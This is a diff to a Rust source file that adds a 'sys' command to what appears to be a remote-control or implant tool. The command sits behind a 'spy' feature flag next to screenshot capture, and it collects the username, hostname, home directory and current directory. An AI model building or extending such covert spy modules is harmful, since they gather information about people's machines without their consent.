@@ -23,6 +23,10 @@ use screenshots::{ Screen, image };
 use std::io::Cursor;
 #[cfg(feature = "spy")]
 use base64::encode;
+#[cfg(feature = "spy")]
+use whoami;
+#[cfg(feature = "spy")]
+use std::env;
 
 #[cfg(feature = "files")]
 use std::io::Read;
@@ -187,6 +191,41 @@ pub fn screenshot(_args: Args, out: OutFun) {
             }
         }
     }
+}
+
+#[cfg(feature = "spy")]
+pub fn sys(_args: Args, out: OutFun) {
+    text_output!(out, "Getting info");
+    let username = whoami::username();
+    let hostname = whoami::hostname();
+    let home_dir: String = match env::var("HOME") {
+        Ok(dir) => dir,
+        Err(err) => {
+            text_output!(out, format!("Error while getting home dir: {:?}", err));
+            "N/A".to_string()
+        }
+    };
+    let current_dir: String = match env::current_dir() {
+        Ok(dir) => if let Some(path) = dir.to_str() {
+            path.to_string()
+        } else {
+            text_output!(out, "Error: Couldn't decode directory");
+            "N/A".to_string()
+        }
+        Err(err) => {
+            text_output!(out, format!("Error while getting current dir: {}", err));
+            "N/A".to_string()
+        }
+    };
+
+    let info = format!(
+        "Username: {}\nHostname: {}\nHome Directory: {}\nCurrent Directory: {}",
+        username,
+        hostname,
+        home_dir,
+        current_dir
+    );
+    text_output!(out, info);
 }
 
 #[cfg(feature = "files")]
